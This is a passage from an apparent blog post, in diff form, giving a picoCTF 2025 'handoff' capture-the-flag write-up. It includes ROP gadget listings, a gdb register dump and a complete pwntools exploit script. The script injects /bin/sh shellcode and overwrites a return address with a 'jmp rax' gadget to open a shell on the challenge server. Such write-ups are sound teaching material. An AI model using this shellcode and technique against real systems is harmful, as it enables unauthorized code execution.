+<span class="line"><span>0x00000000004012f8 : add dword ptr [rbp - 4], 1 ; jmp 0x401249</span></span>
+<span class="line"><span>0x0000000000401085 : add eax, 0xf2000000 ; jmp 0x401020</span></span>
+<span class="line"><span>0x00000000004011f3 : cli ; jmp 0x401180</span></span>
+<span class="line"><span>0x00000000004011f0 : endbr64 ; jmp 0x401180</span></span>
+<span class="line"><span>0x0000000000401165 : je 0x401170 ; mov edi, 0x404060 ; jmp rax</span></span>
+<span class="line"><span>0x00000000004011a7 : je 0x4011b0 ; mov edi, 0x404060 ; jmp rax</span></span>
+<span class="line"><span>0x000000000040103a : jmp 0x401020</span></span>
+<span class="line"><span>0x00000000004011f4 : jmp 0x401180</span></span>
+<span class="line"><span>0x00000000004012fc : jmp 0x401249</span></span>
+<span class="line"><span>0x00000000004012a5 : jmp 0x401407</span></span>
+<span class="line"><span>0x00000000004013f1 : jmp 0x40140c</span></span>
+<span class="line"><span>0x000000000040100b : jmp 0x4840103f</span></span>
+<span class="line"><span>0x000000000040116c : jmp rax</span></span>
+<span class="line"><span>0x00000000004013ed : mov byte ptr [rbp - 5], 0 ; jmp 0x40140c</span></span>
+<span class="line"><span>0x0000000000401167 : mov edi, 0x404060 ; jmp rax</span></span>
+<span class="line"><span>0x00000000004011ec : nop dword ptr [rax] ; endbr64 ; jmp 0x401180</span></span>
+<span class="line"><span>0x0000000000401166 : or dword ptr [rdi + 0x404060], edi ; jmp rax</span></span>
+<span class="line"><span>0x0000000000401163 : test eax, eax ; je 0x401170 ; mov edi, 0x404060 ; jmp rax</span></span>
+<span class="line"><span>0x00000000004011a5 : test eax, eax ; je 0x4011b0 ; mov edi, 0x404060 ; jmp rax</span></span></code></pre>
+<p>There are several gadgets here that use the jmp instruction. One stood out to me as I remembered something I saw while debugging in gdb:</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>[ Legend: Modified register | Code | Heap | Stack | String ]</span></span>
+<span class="line"><span>──────────────────────────────────────────────────────────── registers ────</span></span>
+<span class="line"><span>$rax   : 0x00007fffffffdbb4  →  0x0000000a46464646 ("FFFF\n"?)</span></span>
+<span class="line"><span>$rbx   : 0x00007fffffffdce8  →  0x00007fffffffe070  →  "/home/vsingh/Downloads/CTF/picoCTF_2025/pwn/handof[...]"</span></span>
+<span class="line"><span>$rcx   : 0xa464646         </span></span>
+<span class="line"><span>$rdx   : 0xfbad2288        </span></span>
+<span class="line"><span>$rsp   : 0x00007fffffffd8d0  →  "off/handoff"</span></span>
+<span class="line"><span>$rbp   : 0x00007fffffffdbc0  →  0x00007fffffffdbd0  →  0x0000000000000001</span></span>
+<span class="line"><span>$rsi   : 0xa464646         </span></span>
+<span class="line"><span>$rdi   : 0x00007ffff7f95720  →  0x0000000000000000</span></span>
+<span class="line"><span>$rip   : 0x00000000004013ed  →  &#x3C;vuln+01c4> mov BYTE PTR [rbp-0x5], 0x0</span></span>
+<span class="line"><span>$r8    : 0x00000000004052a5  →  "BBBCCCCCCCCDDDDDDDDEEEEEEEE\n"</span></span>
+<span class="line"><span>$r9    : 0x0               </span></span>
+<span class="line"><span>$r10   : 0x00007ffff7f3afe0  →  0x0000000100000000</span></span>
+<span class="line"><span>$r11   : 0x246             </span></span>
+<span class="line"><span>$r12   : 0x0               </span></span>
+<span class="line"><span>$r13   : 0x00007fffffffdcf8  →  0x00007fffffffe0ac  →  "SHELL=/bin/bash"</span></span>
+<span class="line"><span>$r14   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2e0  →  0x0000000000000000</span></span>
+<span class="line"><span>$r15   : 0x0               </span></span>
+<span class="line"><span>$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]</span></span>
+<span class="line"><span>$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 </span></span></code></pre>
+<p>The <code>$rax</code> register contains the stack address of the start of the feedback buffer.</p>
+<p>We can use the <code>jmp rax</code> gadget to jump to this address and begin the shellcode execution.</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>0x000000000040116c : jmp rax</span></span></code></pre>
+<p>Since the feedback buffer obviously does not have enough space for the entire shellcode we can perform a relative jump to the shellcode in the <code>msg</code> char array in the first entry.
+We can do:</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>(feedback array address) - (msg array address) - (length of jmp instruction)</span></span>
+<span class="line"><span>0x7fffffffdbb4 - 0x7fffffffd8e8 - 0x5 = 0xfffffd2f (-721)</span></span></code></pre>
+<p>The assembly code for this would be:</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">E9 2f FD FF FF   </span><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic">; JMP -716</span></span></code></pre>
+<p>We can write this in bytes as:</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>jmp_bytes = b'\xe9\x2f\xfd\xff\xff'</span></span></code></pre>
+<h2 id="summary">Summary</h2>
+<p>We can input shellcode in the <code>msg</code> char array of the first entry. Then we can take advantage of the buffer overflow vulnerability and overwrite the return address and modify it to the address of the <code>jmp rax</code> ROP gadget. Since <code>$rax</code> contains the address of the beginning of the feedback buffer, we need to input <code>jmp_bytes</code> before we overflow.</p>
+<h2 id="full-solution">Full-Solution</h2>
+<pre class="astro-code astro-code-themes min-light night-owl" style="background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">from</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB"> pwn </span><span style="color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">import</span><span style="color:#D32F2F;--shiki-dark:#C792EA"> *</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic"># Set up the connection</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">context</span><span style="color:#212121;--shiki-dark:#D6DEEB">.</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">arch </span><span style="color:#D32F2F;--shiki-dark:#C792EA">=</span><span style="color:#22863A;--shiki-dark:#D9F5DD"> '</span><span style="color:#22863A;--shiki-dark:#ECC48D">amd64</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">context</span><span style="color:#212121;--shiki-dark:#D6DEEB">.</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">log_level </span><span style="color:#D32F2F;--shiki-dark:#C792EA">=</span><span style="color:#22863A;--shiki-dark:#D9F5DD"> '</span><span style="color:#22863A;--shiki-dark:#ECC48D">critical</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">p </span><span style="color:#D32F2F;--shiki-dark:#C792EA">=</span><span style="color:#6F42C1;--shiki-dark:#B2CCD6"> remote</span><span style="color:#212121;--shiki-dark:#D6DEEB">(</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span><span style="color:#22863A;--shiki-dark:#ECC48D">shape-facility.picoctf.net</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span><span style="color:#212121;--shiki-dark:#D9F5DD">,</span><span style="color:#1976D2;--shiki-dark:#F78C6C"> 50924</span><span style="color:#212121;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic"># execute /bin/sh shellcode</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">shellcode </span><span style="color:#D32F2F;--shiki-dark:#C792EA">=</span><span style="color:#D32F2F;--shiki-dark:#C792EA"> b</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#22863A;--shiki-dark:#F78C6C">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span></span>
+<span class="line"><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic"># jmp rax address</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">jmp_rax </span><span style="color:#D32F2F;--shiki-dark:#C792EA">=</span><span style="color:#D32F2F;--shiki-dark:#C792EA"> 0x</span><span style="color:#1976D2;--shiki-dark:#F78C6C">40116c</span></span>
+<span class="line"><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic"># jmp -721 shellcode</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">jmp_bytes </span><span style="color:#D32F2F;--shiki-dark:#C792EA">=</span><span style="color:#D32F2F;--shiki-dark:#C792EA"> b</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span><span style="color:#22863A;--shiki-dark:#F78C6C">\xe9\x2f\xfd\xff\xff</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic"># Inject shellcode</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">p</span><span style="color:#212121;--shiki-dark:#D6DEEB">.</span><span style="color:#6F42C1;--shiki-dark:#B2CCD6">sendlineafter</span><span style="color:#212121;--shiki-dark:#D6DEEB">(</span><span style="color:#D32F2F;--shiki-dark:#C792EA">b</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span><span style="color:#22863A;--shiki-dark:#ECC48D">3. Exit the app</span><span style="color:#22863A;--shiki-dark:#F78C6C">\n</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span><span style="color:#212121;--shiki-dark:#D9F5DD">,</span><span style="color:#D32F2F;--shiki-dark:#C792EA"> b</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span><span style="color:#22863A;--shiki-dark:#ECC48D">1</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span><span style="color:#212121;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">p</span><span style="color:#212121;--shiki-dark:#D6DEEB">.</span><span style="color:#6F42C1;--shiki-dark:#B2CCD6">sendlineafter</span><span style="color:#212121;--shiki-dark:#D6DEEB">(</span><span style="color:#D32F2F;--shiki-dark:#C792EA">b</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#22863A;--shiki-dark:#ECC48D">What's the new recipient's name: </span><span style="color:#22863A;--shiki-dark:#F78C6C">\n</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#212121;--shiki-dark:#D9F5DD">,</span><span style="color:#D32F2F;--shiki-dark:#C792EA"> b</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#22863A;--shiki-dark:#F78C6C">\x90</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#D32F2F;--shiki-dark:#C792EA"> *</span><span style="color:#1976D2;--shiki-dark:#F78C6C"> 8</span><span style="color:#212121;--shiki-dark:#D6DEEB">)</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB"> </span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">p</span><span style="color:#212121;--shiki-dark:#D6DEEB">.</span><span style="color:#6F42C1;--shiki-dark:#B2CCD6">sendlineafter</span><span style="color:#212121;--shiki-dark:#D6DEEB">(</span><span style="color:#D32F2F;--shiki-dark:#C792EA">b</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span><span style="color:#22863A;--shiki-dark:#ECC48D">3. Exit the app</span><span style="color:#22863A;--shiki-dark:#F78C6C">\n</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span><span style="color:#212121;--shiki-dark:#D9F5DD">,</span><span style="color:#D32F2F;--shiki-dark:#C792EA"> b</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span><span style="color:#22863A;--shiki-dark:#ECC48D">2</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span><span style="color:#212121;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">p</span><span style="color:#212121;--shiki-dark:#D6DEEB">.</span><span style="color:#6F42C1;--shiki-dark:#B2CCD6">sendlineafter</span><span style="color:#212121;--shiki-dark:#D6DEEB">(</span><span style="color:#D32F2F;--shiki-dark:#C792EA">b</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span><span style="color:#22863A;--shiki-dark:#ECC48D">Which recipient would you like to send a message to?</span><span style="color:#22863A;--shiki-dark:#F78C6C">\n</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span><span style="color:#212121;--shiki-dark:#D9F5DD">,</span><span style="color:#D32F2F;--shiki-dark:#C792EA"> b</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span><span style="color:#22863A;--shiki-dark:#ECC48D">0</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span><span style="color:#212121;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">p</span><span style="color:#212121;--shiki-dark:#D6DEEB">.</span><span style="color:#6F42C1;--shiki-dark:#B2CCD6">sendlineafter</span><span style="color:#212121;--shiki-dark:#D6DEEB">(</span><span style="color:#D32F2F;--shiki-dark:#C792EA">b</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span><span style="color:#22863A;--shiki-dark:#ECC48D">What message would you like to send them?</span><span style="color:#22863A;--shiki-dark:#F78C6C">\n</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span><span style="color:#212121;--shiki-dark:#D9F5DD">,</span><span style="color:#212121;--shiki-dark:#82AAFF"> shellcode</span><span style="color:#212121;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic"># Add jmp -721 bytes code (to jump to shellcode) and some padding</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">payload </span><span style="color:#D32F2F;--shiki-dark:#C792EA">=</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB"> jmp_bytes </span><span style="color:#D32F2F;--shiki-dark:#C792EA">+</span><span style="color:#D32F2F;--shiki-dark:#C792EA"> b</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span><span style="color:#22863A;--shiki-dark:#ECC48D">B</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span><span style="color:#D32F2F;--shiki-dark:#C792EA"> *</span><span style="color:#1976D2;--shiki-dark:#F78C6C"> 7</span><span style="color:#D32F2F;--shiki-dark:#C792EA"> +</span><span style="color:#D32F2F;--shiki-dark:#C792EA"> b</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span><span style="color:#22863A;--shiki-dark:#ECC48D">C</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span><span style="color:#D32F2F;--shiki-dark:#C792EA"> *</span><span style="color:#1976D2;--shiki-dark:#F78C6C"> 8</span></span>
+<span class="line"><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic"># Overwrite return address with jmp rax gadget</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">payload </span><span style="color:#D32F2F;--shiki-dark:#C792EA">+=</span><span style="color:#6F42C1;--shiki-dark:#B2CCD6"> p64</span><span style="color:#212121;--shiki-dark:#D6DEEB">(</span><span style="color:#212121;--shiki-dark:#82AAFF">jmp_rax</span><span style="color:#212121;--shiki-dark:#D6DEEB">)</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB"> </span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">p</span><span style="color:#212121;--shiki-dark:#D6DEEB">.</span><span style="color:#6F42C1;--shiki-dark:#B2CCD6">sendlineafter</span><span style="color:#212121;--shiki-dark:#D6DEEB">(</span><span style="color:#D32F2F;--shiki-dark:#C792EA">b</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span><span style="color:#22863A;--shiki-dark:#ECC48D">3. Exit the app</span><span style="color:#22863A;--shiki-dark:#F78C6C">\n</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span><span style="color:#212121;--shiki-dark:#D9F5DD">,</span><span style="color:#D32F2F;--shiki-dark:#C792EA"> b</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span><span style="color:#22863A;--shiki-dark:#ECC48D">3</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span><span style="color:#212121;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">p</span><span style="color:#212121;--shiki-dark:#D6DEEB">.</span><span style="color:#6F42C1;--shiki-dark:#B2CCD6">sendlineafter</span><span style="color:#212121;--shiki-dark:#D6DEEB">(</span><span style="color:#D32F2F;--shiki-dark:#C792EA">b</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span><span style="color:#22863A;--shiki-dark:#ECC48D">If you could take a second to write a quick review, we would really appreciate it: </span><span style="color:#22863A;--shiki-dark:#F78C6C">\n</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span><span style="color:#212121;--shiki-dark:#D9F5DD">,</span><span style="color:#212121;--shiki-dark:#82AAFF"> payload</span><span style="color:#212121;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic"># Access shell</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">p</span><span style="color:#212121;--shiki-dark:#D6DEEB">.</span><span style="color:#6F42C1;--shiki-dark:#B2CCD6">interactive</span><span style="color:#212121;--shiki-dark:#D6DEEB">()</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB"> </span></span>
+<span class="line"></span></code></pre>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://shell-storm.org/shellcode/files/shellcode-806.html">Shell-Storm - [Linux/x86-64 - Execute /bin/sh - 27 bytes] by Dad`</a></li>
+<li><a href="https://www.youtube.com/watch?v=D1yzO0hd5Po&#x26;t=229s">Injecting Shellcode | PicoCTF [37] Shellz by John Hammond</a></li>
+</ul> </article> <hr class="my-8 border-dashed">  <ul class="mt-4 mb-8 sm:my-8"> <li class="group inline-block group-hover:cursor-pointer my-1 underline-offset-4"> <a href="/tags/pwn/" class="relative pr-2 text-lg underline decoration-dashed group-hover:-top-0.5 group-hover:text-accent focus-visible:p-1 text-sm" data-astro-transition-scope="astro-36ssibgs-2"> <svg viewBox="0 0 24 24" role="img"  width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block opacity-80 -mr-3.5 size-4"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M5 9l14 0" /><path d="M5 15l14 0" /><path d="M11 4l-4 16" /><path d="M17 4l-4 16" /></svg>
+&nbsp;<span>pwn</span> </a> </li><li class="group inline-block group-hover:cursor-pointer my-1 underline-offset-4"> <a href="/tags/rev/" class="relative pr-2 text-lg underline decoration-dashed group-hover:-top-0.5 group-hover:text-accent focus-visible:p-1 text-sm" data-astro-transition-scope="astro-36ssibgs-3"> <svg viewBox="0 0 24 24" role="img"  width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block opacity-80 -mr-3.5 size-4"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M5 9l14 0" /><path d="M5 15l14 0" /><path d="M11 4l-4 16" /><path d="M17 4l-4 16" /></svg>
+&nbsp;<span>rev</span> </a> </li><li class="group inline-block group-hover:cursor-pointer my-1 underline-offset-4"> <a href="/tags/pico-ctf-2025/" class="relative pr-2 text-lg underline decoration-dashed group-hover:-top-0.5 group-hover:text-accent focus-visible:p-1 text-sm" data-astro-transition-scope="astro-36ssibgs-4"> <svg viewBox="0 0 24 24" role="img"  width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block opacity-80 -mr-3.5 size-4"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M5 9l14 0" /><path d="M5 15l14 0" /><path d="M11 4l-4 16" /><path d="M17 4l-4 16" /></svg>
+&nbsp;<span>picoCTF 2025</span> </a> </li><li class="group inline-block group-hover:cursor-pointer my-1 underline-offset-4"> <a href="/tags/pico-ctf/" class="relative pr-2 text-lg underline decoration-dashed group-hover:-top-0.5 group-hover:text-accent focus-visible:p-1 text-sm" data-astro-transition-scope="astro-36ssibgs-5"> <svg viewBox="0 0 24 24" role="img"  width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block opacity-80 -mr-3.5 size-4"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M5 9l14 0" /><path d="M5 15l14 0" /><path d="M11 4l-4 16" /><path d="M17 4l-4 16" /></svg>
+&nbsp;<span>picoCTF</span> </a> </li> </ul> <div class="flex flex-col items-center justify-between gap-6 sm:flex-row sm:items-end sm:gap-4"> <div class="flex flex-col flex-wrap items-center justify-center gap-1 sm:items-start"> <span class="italic">Share this post on:</span> <div class="text-center"> <a href="https://wa.me/?text=https://e27ec68b.exfuturo.pages.dev/posts/pico-ctf-2025/handoff/picoctf-2025-handoff/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post via WhatsApp"> <svg viewBox="0 0 24 24" role="img"  width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M3 21l1.65 -3.8a9 9 0 1 1 3.4 2.9l-5.05 .9" /><path d="M9 10a.5 .5 0 0 0 1 0v-1a.5 .5 0 0 0 -1 0v1a5 5 0 0 0 5 5h1a.5 .5 0 0 0 0 -1h-1a.5 .5 0 0 0 0 1" /></svg> <span class="sr-only">Share this post via WhatsApp</span> </a><a href="https://t.me/share/url?url=https://e27ec68b.exfuturo.pages.dev/posts/pico-ctf-2025/handoff/picoctf-2025-handoff/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post via Telegram"> <svg viewBox="0 0 24 24" role="img"  width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M15 10l-4 4l6 6l4 -16l-18 7l4 2l2 6l3 -4" /></svg> <span class="sr-only">Share this post via Telegram</span> </a><a href="https://pinterest.com/pin/create/button/?url=https://e27ec68b.exfuturo.pages.dev/posts/pico-ctf-2025/handoff/picoctf-2025-handoff/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post on Pinterest"> <svg viewBox="0 0 24 24" role="img"  width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M8 20l4 -9" /><path d="M10.7 14c.437 1.263 1.43 2 2.55 2c2.071 0 3.75 -1.554 3.75 -4a5 5 0 1 0 -9.7 1.7" /><path d="M12 12m-9 0a9 9 0 1 0 18 0a9 9 0 1 0 -18 0" /></svg> <span class="sr-only">Share this post on Pinterest</span> </a><a href="mailto:?subject=See%20this%20post&#38;body=https://e27ec68b.exfuturo.pages.dev/posts/pico-ctf-2025/handoff/picoctf-2025-handoff/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post via email"> <svg viewBox="0 0 24 24" role="img"  width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z" /><path d="M3 7l9 6l9 -6" /></svg> <span class="sr-only">Share this post via email</span> </a> </div> </div> <button id="back-to-top" class="focus-outline py-1 whitespace-nowrap hover:opacity-75"> <svg viewBox="0 0 24 24" role="img"  width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block rotate-90"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M15 6l-6 6l6 6" /></svg> <span>Back to Top</span> </button> </div> <hr class="my-6 border-dashed"> <!-- Previous/Next Post Buttons --> <div data-pagefind-ignore class="grid grid-cols-1 gap-6 sm:grid-cols-2"> <a href="/posts/picoctf-2025-SSTI1" class="flex w-full gap-1 hover:opacity-75"> <svg viewBox="0 0 24 24" role="img"  width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block flex-none"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M15 6l-6 6l6 6" /></svg> <div> <span>Previous Post</span> <div class="text-sm text-accent/85">picoCTF 2025 - SSTI1</div> </div> </a>  </div> </main> <footer class="w-full mt-auto"> <div class="max-w-3xl mx-auto px-0"> <hr class="border-border" aria-hidden="true"> </div> <div class="flex flex-col items-center justify-between py-6 sm:flex-row-reverse sm:py-4"> <div class="flex-wrap justify-center gap-1 flex"> <a href="https://github.com/vsingh21/CTF_Writeups" class="group inline-block hover:text-accent p-2 hover:rotate-6 sm:p-1" title=" ex futuro on Github"> <svg viewBox="0 0 24 24" role="img"  width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" /></svg> <span class="sr-only"> ex futuro on Github</span> </a><a href="mailto:singhviraj210806@gmail.com" class="group inline-block hover:text-accent p-2 hover:rotate-6 sm:p-1" title="Send an email to ex futuro"> <svg viewBox="0 0 24 24" role="img"  width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z" /><path d="M3 7l9 6l9 -6" /></svg> <span class="sr-only">Send an email to ex futuro</span> </a> </div> <div class="my-2 flex flex-col items-center whitespace-nowrap sm:flex-row"> <span>Copyright &#169; 2025</span> <span class="hidden sm:inline">&nbsp;|&nbsp;</span> <span>All rights reserved.</span> </div> </div> </footer>  </body></html> <script data-astro-rerun>
+  /** Create a progress indicator
+   *  at the top */
+  function createProgressBar() {
+    // Create the main container div
+    const progressContainer = document.createElement("div");
+    progressContainer.className =
+      "progress-container fixed top-0 z-10 h-1 w-full bg-background";
+
+    // Create the progress bar div
+    const progressBar = document.createElement("div");
+    progressBar.className = "progress-bar h-1 w-0 bg-accent";
